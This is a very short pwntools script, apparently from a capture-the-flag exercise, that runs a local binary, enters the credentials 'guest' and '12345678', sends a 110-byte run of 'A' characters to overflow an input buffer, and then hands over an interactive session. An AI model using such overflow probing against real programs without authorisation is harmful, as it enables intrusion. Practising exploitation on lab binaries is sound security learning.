from pwn import *

p = process("./main")
p.sendline("guest")
p.sendline("12345678")
p.sendline("A"*110)

p.interactive()
